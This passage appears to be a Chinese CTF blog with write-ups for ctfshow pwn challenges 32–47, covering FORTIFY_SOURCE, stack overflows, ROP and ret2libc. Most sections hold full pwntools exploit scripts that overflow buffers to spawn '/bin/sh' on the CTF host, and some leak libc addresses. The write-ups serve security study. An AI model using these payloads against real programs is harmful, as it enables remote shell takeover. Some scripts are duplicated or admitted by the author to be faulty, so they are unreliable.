可能导致潜在的安全漏洞。</h5><p>我们先来分析一下代码的逻辑： 程序打印出logo的信息，然后然后将第一个参数argv[1]也就是我们启动程序输入的第一个参数(其实还有argv[0]的，这个参数是每个程序的都一定会有的，并且值为程序名称)赋给v4，并且没有长度限制。之后程序将v4[10]的数组内容赋给buf1[10]数组，再将CTFshowPWN通过strcpy函数赋给buf2，接着打印输出buf1和buf2。再然后通过strtol(argv[3], 0LL, 10)将我们启动程序传入的第三个参数转为10进制赋给v5，紧接着使用memcpy函数将argv2的v5个字符赋给buf1，v5是int型，数值就是上条语句的得来的；然后再通过strcpy函数argv[1]我们输入第一个参数赋给buf2，之后再打印输出buf1和buf2，最后读取_bss_start 11个字符给buf1，打印输出buf1和num的信息。最最后通过if判断argc是否大于4(默认情况下argc是等于1的，因为argv[0]必定存在，我们输入一个参数，argc就会等于2，依次递推)，如果大于4，就会进入Undefined函数，Undefined函数的作用就是输出flag了。</p><p>因为本题目FORTIFY_SOURCE没有开启，代表我们启动函数直接输入4个参数(这时argc&#x3D;5 &gt; 4)就行了，而且这4个参数没有长度限制，如果开启FORTIFY_SOURCE就不好说了，因为开启了之后，由于程序存在strcpy和memcpy函数会检测长度，如果长度超过了限制，可能会使程序抛出异常而退出执行。</p><p>那么这道题目我们就直接输入4个参数就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pwnme 1 2 3 4</span><br></pre></td></tr></table></figure><p>这时程序会停在这里，我们直接一个回车就行了。</p><h3 id="pwn33"><a href="#pwn33" class="headerlink" title="pwn33"></a>pwn33</h3><p>memcpy和strcpy这两个函数被替换成了<strong>mencpy_chk和</strong>strcpy__chk安全函数，可以看到这两个函数相比前两个函数只是加上了11LL这个参数加以限制，因为buf1和buf2在声明的时候的长度就是11，所以程序为了防止溢出，使用后两个函数加上这两个数组的长度加以限制以防溢出。</p><p>我们就保证我们输入的第一个参数和第二个参数的长度不超过11就行了啊，只是上到题目没有开启FORTIFY_SOURCE，我们输入参数的长度是任意的，这道题目对我们的参数加以限制了而以。</p><p>我们直接ssh连接，运行pwnme加上不超过11长度的4个参数就行了(主要是参数1和参数2不超过11)，那我们就和上道题目一样每个参数长度都为1呗。</p><h3 id="pwn34"><a href="#pwn34" class="headerlink" title="pwn34"></a>pwn34</h3><p>FORTIFY_SOURCE&#x3D;2： 启用 Fortify 功能的高级级别。 包括基本级别的安全检查，并添加了更多的检查。 在编译时进行更严格的检查，如更精确的缓冲区边界检查。 提供更丰富的编译器警告和错误信息。</p><p><strong>mencpy_chk和</strong>strcpy<strong>chk安全函数上道题目已经说过与memcpy和strcpy的区别，这里不再赘述。</strong> printf__chk该函数与printf的区别在于： 不能使用 %x$n 不连续地打印，也就是说如果要使用 %3$n，则必须同时使用 %1$n 和 %2$n。在使用 %n 的时候会做一些检查。 这个涉及到格式化字符串漏洞，本题涉及不到，所以对本道题也几乎阻碍不大，所以我们还是ssh之后运行文件时输入的4个长度为1的参数，不出意外还能到拿到flag！</p><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="pwn36"><a href="#pwn36" class="headerlink" title="pwn36"></a>pwn36</h3><p>gets函数是没有长度限制的，可以发生栈溢出！</p><p>所以我们的大致思路就是通过栈溢出，将ctfshow函数的返回地址覆盖为get_flag函数的地址，这样我们就可以控制程序的执行流程，进而拿到flag。</p><p>首先看ida中s[36]数组的大小为36，加上我们还要覆盖掉ebp的值(ebp后面是返回地址，前面是局部变量s数组的栈空间)，我们需要的填充数据长度就为36 + 4即0x28 + 0x4，我们通过gdb的disass get_flag命令就可以得到get_flag函数的汇编代码，其中就有get_flag函数的首地址，所以我们大致的payload就为：(0x28 + 0x4 ) * ‘a’ + p32(get_flag函数的地址)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28312&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x12 + 0x4</span><br><span class="line">get_flag_addr = 0x8048521</span><br><span class="line">payload = offset * &#x27;a&#x27; + p32(get_flag_addr)</span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn37"><a href="#pwn37" class="headerlink" title="pwn37"></a>pwn37</h3><h5 id="32位的-system-“-x2F-bin-x2F-sh”-后门函数给你"><a href="#32位的-system-“-x2F-bin-x2F-sh”-后门函数给你" class="headerlink" title="32位的 system(“&#x2F;bin&#x2F;sh”) 后门函数给你"></a>32位的 system(“&#x2F;bin&#x2F;sh”) 后门函数给你</h5><p>直接改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28312&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x12 + 0x4</span><br><span class="line">get_flag_addr = 0x8048521</span><br><span class="line">payload = offset * &#x27;a&#x27; + p32(get_flag_addr)</span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn38"><a href="#pwn38" class="headerlink" title="pwn38"></a>pwn38</h3><h5 id="改64位"><a href="#改64位" class="headerlink" title="改64位"></a>改64位</h5><p>值得注意的是，这里需要用lea命令的地址作为覆盖的地址，而不是backdoor函数的地址，才疏学浅不知道为什么，可能是修改了栈的值导致出现错误</p><h3 id="pwn39"><a href="#pwn39" class="headerlink" title="pwn39"></a>pwn39</h3><h5 id="32位的-system-“-x2F-bin-x2F-sh”"><a href="#32位的-system-“-x2F-bin-x2F-sh”" class="headerlink" title="32位的 system(); “&#x2F;bin&#x2F;sh”"></a>32位的 system(); “&#x2F;bin&#x2F;sh”</h5><p>但是这里不是system(“&#x2F;bin&#x2F;sh”)了，而是将函数和参数分割，两者都在程序中，所以可以通过栈溢出自行构造完整后门，栈上传参</p><p>自行构造完整后门（调用链）对溢出长度有要求，至少要能溢出除ip以外再多2个机器字长（32位4 bit；64位8bit），用于写入调用步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#payload=[填充]+[system@plt]+[4bytes填充]+[参数]</span><br><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28113&quot;)</span><br><span class="line"> </span><br><span class="line">offset = 0x12 + 0x4</span><br><span class="line">system_addr = 0x080483A0</span><br><span class="line">binsh_addr = 0x8048750</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(system_addr) + b&#x27;aaaa&#x27; + p32(binsh_addr)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn40"><a href="#pwn40" class="headerlink" title="pwn40"></a>pwn40</h3><h5 id="64位的-system-“-x2F-bin-x2F-sh”"><a href="#64位的-system-“-x2F-bin-x2F-sh”" class="headerlink" title="64位的 system(); “&#x2F;bin&#x2F;sh”"></a>64位的 system(); “&#x2F;bin&#x2F;sh”</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28227&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x0A + 0x8</span><br><span class="line">system_addr = 0x602080</span><br><span class="line">binsh_addr = 0x400808</span><br><span class="line">payload = offset*b&#x27;a&#x27; + p64(system_addr)+b&#x27;aaaaaaaa&#x27;+p64(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>本来以为也是改一改就可以的，，但是错了。。</p><h5 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h5><p>这里介绍一下ROPgadget工具，该工具可以绕过NX保护，在栈缓冲区溢出的基础上，利用程序中已有的小片段（gadgets）来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>64位汇编传参，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。 当参数为7个以上时，前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p><p>有的题，里面既没有现成的system也没有&#x2F;bin&#x2F;sh字符串，也没有提供libc.so给我们，那么我们要做的就是想办法泄露libc地址，拿到system函数和&#x2F;bin&#x2F;sh字符串；我们就需要获取rdi, rsi, rdx, rcx, r8, r9它们的地址，首先要获取的是rdi的地址。这就是 ROPgadget 的作用。</p><p>回到本题，下面利用ROPgadget获得rdi的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep rdi</span><br></pre></td></tr></table></figure><p>获取ret的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#payload=[填充]+[pop_rdi_ret]+[参数]+[system@plt]</span><br><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28151&quot;)</span><br><span class="line"> </span><br><span class="line">offset = 0xA + 0x8</span><br><span class="line">ret_addr = 0x00000000004004fe</span><br><span class="line">system_addr = 0x400520</span><br><span class="line">binsh_addr = 0x400808</span><br><span class="line">rdi_addr = 0x00000000004007e3</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p64(rdi_addr) + p64(binsh_addr)  + p64(ret_addr) + p64(system_addr)</span><br><span class="line">#这里ret_addr的作用是作为一个8字节的间接跳转指令，用于绕过栈中的返回地址，以达到执行system函数的目的</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>1.pwn36-pwn38：完整后门&amp;溢出长度大于等于ip。只要我们调用这个后门函数，不需要其他额外的操作就能getshell，通常是system(‘&#x2F;bin&#x2F;sh’)，write(1,’flag’,32)等形式。</p><p>payload &#x3D; [填充] + [get_shell_addr]</p><p>2.pwn39、wn40：残缺后门&amp;溢出长度远大于ip。这里指的远大于ip，意思是可以溢出覆盖除了ip以外的2个以上的（一般情况，实际情况实际分析）机器字长。残缺后门的形式多种多样：提供诸如system等关键函数，flag、&#x2F;bin&#x2F;sh等字符串，某些gadget等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=[填充]+[system@plt]+[4bit填充]+[参数]  #32位</span><br><span class="line">payload=[填充]+[pop_rdi_ret]+[参数]+[system@plt]  #64位</span><br></pre></td></tr></table></figure><p>原文链接：<a href="https://blog.csdn.net/weixin_63576152/article/details/132437169">https://blog.csdn.net/weixin_63576152/article/details/132437169</a></p><h3 id="pwn41"><a href="#pwn41" class="headerlink" title="pwn41"></a>pwn41</h3><h5 id="32位的-system-但是没”-x2F-bin-x2F-sh”-，好像有其他的可以替代"><a href="#32位的-system-但是没”-x2F-bin-x2F-sh”-，好像有其他的可以替代" class="headerlink" title="32位的 system(); 但是没”&#x2F;bin&#x2F;sh”  ，好像有其他的可以替代"></a>32位的 system(); 但是没”&#x2F;bin&#x2F;sh”  ，好像有其他的可以替代</h5><p>这里先介绍一下&#x2F;bin&#x2F;sh和&#x2F;sh的区别：</p><p>system(“&#x2F;bin&#x2F;sh”) 是直接指定了系统默认的shell程序路径来执行命令，这种方式可以确保使用系统默认的shell程序执行命令，因为 &#x2F;bin&#x2F;sh 链接通常指向默认shell的可执行文件。 system(“sh”) 则会直接启动一个名为sh的shell程序，依赖系统的环境变量 $PATH 来查找 sh 可执行文件并执行。如果系统的环境变量设置正确，这两种方式是等效的；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28297&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 0x12 + 0x4</span><br><span class="line">system = 0x80483D0</span><br><span class="line">sh = 0x80487BA</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(system) + b&#x27;aaaa&#x27; + p32(sh)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn42"><a href="#pwn42" class="headerlink" title="pwn42"></a>pwn42</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28235&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 0x0A + 0x8</span><br><span class="line">system_addr = 0x400560</span><br><span class="line">sh_addr = 0x400872</span><br><span class="line">rdi_addr = 0x400843</span><br><span class="line">ret_addr = 0x40053e</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p64(rdi_addr) + p64(sh_addr) + p64(ret_addr) + p64(system_addr)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn43"><a href="#pwn43" class="headerlink" title="pwn43"></a>pwn43</h3><h5 id="32位的-system-但是好像没”-x2F-bin-x2F-sh”-上面的办法不行了，想想办法"><a href="#32位的-system-但是好像没”-x2F-bin-x2F-sh”-上面的办法不行了，想想办法" class="headerlink" title="32位的 system(); 但是好像没”&#x2F;bin&#x2F;sh”  上面的办法不行了，想想办法"></a>32位的 system(); 但是好像没”&#x2F;bin&#x2F;sh”  上面的办法不行了，想想办法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">payload = [填充] + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system_addr) + [4bytes填充] +p32(buf2)</span><br><span class="line">#1.填充后溢出，执行gets函数，接收数据</span><br><span class="line">#2.将数据从栈中弹出存入寄存器ebx中</span><br><span class="line">#3.再用缓冲区指针buf2指向寄存器ebx的数据</span><br><span class="line">#4.调用system函数，参数为buf2所指数据，即gets接收的数据</span><br><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28280&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 0x6c + 4</span><br><span class="line">system_addr = 0x8048450</span><br><span class="line">buf2 = 0x804B060</span><br><span class="line">gets = 0x8048420</span><br><span class="line">pop_ebx = 0x08048409</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system_addr) + b&#x27;aaaa&#x27; +p32(buf2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn44"><a href="#pwn44" class="headerlink" title="pwn44"></a>pwn44</h3><p>64位的 system(); 但是好像没”&#x2F;bin&#x2F;sh”  上面的办法不行了，想想办法</p><p>和上题一样，区别就是64位没有ebx寄存器，还需要用rdi代替，先找到地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28209&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 0xA + 8</span><br><span class="line">system_addr = 0x400520</span><br><span class="line">buf2 = 0x602080</span><br><span class="line">gets = 0x400530</span><br><span class="line">pop_rdi = 0x4007f3</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p64(pop_rdi) + p64(buf2) + p64(gets) + p64(pop_rdi) + p64(buf2) + p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>1.利用 pop_rdi 指令将 buf2 的地址加载到rdi寄存器中，因为在调用gets函数之前，你需要将输入的缓冲区的地址（即buf2的地址）传递给gets函数，以便gets函数知道将输入数据存储在哪个缓冲区中 2.调用 gets 函数，以 buf2 的地址作为参数，从用户输入中读取数据，并将其存储在buf2中 3.再次利用 pop_rdi 指令将 buf2 的地址加载到rdi 寄存器中 4.调用 system 函数，以 buf2 的地址作为参数</p><h3 id="pwn45"><a href="#pwn45" class="headerlink" title="pwn45"></a>pwn45</h3><h5 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h5><p>..。。打了一天没大通。算料。。</p><p>呃呃打通了。。。。（五分钟后觉得有问题。。</p><p>#正解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#right</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28187&quot;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">offset = 0x6B + 0x4</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(write_plt) + p32(main_addr) + p32(0) + p32(write_got)+ p32(4)</span><br><span class="line">p.recvuntil(&#x27;O.o?&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">libc = LibcSearcher(&quot;write&quot;, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(&quot;write&quot;)</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(system_addr) + b&#x27;aaaa&#x27; + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn46"><a href="#pwn46" class="headerlink" title="pwn46"></a>pwn46</h3><p>？神奇，得先</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">readelf -s pwn</span><br><span class="line">objdump -R pwn</span><br></pre></td></tr></table></figure><p>溜一遍？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28141)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">main = elf.sym[&#x27;main&#x27;]</span><br><span class="line">pop_rdi = 0x400803         </span><br><span class="line">pop_rsi_r15 = 0x400801     </span><br><span class="line"></span><br><span class="line">payload  = cyclic(0x70+8) + p64(pop_rdi) + p64(1)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(write_got) + p64(0)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;O.o?&quot;,payload)</span><br><span class="line">write = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">print hex(write)</span><br><span class="line">libc = LibcSearcher(&#x27;write&#x27;,write)</span><br><span class="line">libc_base = write - libc.dump(&#x27;write&#x27;)</span><br><span class="line">system = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">payload = cyclic(0x70+8) + p64(pop_rdi) + p64(bin_sh) + p64(system)</span><br><span class="line">io.sendlineafter(&quot;O.o?&quot;,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>。。</p><h2 id="ret2libc-1"><a href="#ret2libc-1" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="pwn47"><a href="#pwn47" class="headerlink" title="pwn47"></a>pwn47</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> from LibcSearcher import *</span><br><span class="line"> context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"> #io = process(&#x27;./pwn&#x27;)</span><br><span class="line"> io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28200)</span><br><span class="line"> elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"> io.recvuntil(&quot;puts: &quot;)</span><br><span class="line"> puts = eval(io.recvuntil(&quot;\n&quot; , drop = True))</span><br><span class="line"> io.recvuntil(&quot;gift: &quot;)</span><br><span class="line"> bin_sh = eval(io.recvuntil(&quot;\n&quot; , drop = True))</span><br><span class="line"> libc = LibcSearcher(&quot;puts&quot; , puts)</span><br><span class="line"> libc_base = puts - libc.dump(&quot;puts&quot;)</span><br><span class="line"> system = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line"> paylad = &quot;a&quot;*(0x9c+4) + p32(system) + p32(0) + p32(bin_sh)</span><br><span class="line"> io.sendline(paylad)</span><br><span class="line"> io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PWN-study&quot;&gt;&lt;a href=&quot;#PWN-study&quot; class=&quot;headerlink&quot; title=&quot;PWN-study&quot;&gt;&lt;/a&gt;PWN-study&lt;/h1&gt;&lt;h3 id=&quot;pwn0&quot;&gt;&lt;a href=&quot;#pwn0&quot; class=&quot;headerli</summary>
      
    
    
    
    
    <category term="CTF PWN" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF-PWN/"/>
    
  </entry>
  
  <entry>
    <title>Re百题计划（越来越烂啦！！这些题都给我重写！！！！</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/05/04/Re%E7%99%BE%E9%A2%98%E8%AE%A1%E5%88%92%EF%BC%88/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/05/04/Re%E7%99%BE%E9%A2%98%E8%AE%A1%E5%88%92%EF%BC%88/</id>
    <published>2024-05-03T16:00:00.000Z</published>
    <updated>2024-10-30T11:40:39.421Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Re百题计划（"><a href="#Re百题计划（" class="headerlink" title="Re百题计划（"></a>Re百题计划（</h1><h2 id="1-你是真的大学生吗？"><a href="#1-你是真的大学生吗？" class="headerlink" title="1.你是真的大学生吗？"></a>1.你是真的大学生吗？</h2><h5 id="硬读汇编"><a href="#硬读汇编" class="headerlink" title="硬读汇编"></a>硬读汇编</h5><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">start           proc near</span><br><span class="line">seg001:<span class="number">0000</span>                 mov     ax, seg dseg</span><br><span class="line">seg001:<span class="number">0003</span>                 mov     ds, ax</span><br><span class="line">seg001:<span class="number">0005</span>                 assume ds:dseg</span><br><span class="line">seg001:<span class="number">0005</span>                 lea     dx, unk_10000</span><br><span class="line">seg001:<span class="number">0009</span>                 mov     ah, <span class="number">9</span></span><br><span class="line">seg001:<span class="number">000</span>B                 int     <span class="number">21</span>h             ; DOS - PRINT STRING</span><br><span class="line">seg001:<span class="number">000</span>B                                         ; DS:DX <span class="punctuation">-&gt;</span> string terminated by <span class="string">&quot;$&quot;</span></span><br><span class="line">seg001:<span class="number">000</span>D                 lea     dx, unk_1002D</span><br><span class="line">seg001:<span class="number">0011</span>                 mov     ah, <span class="number">0</span>Ah</span><br><span class="line">seg001:<span class="number">0013</span>                 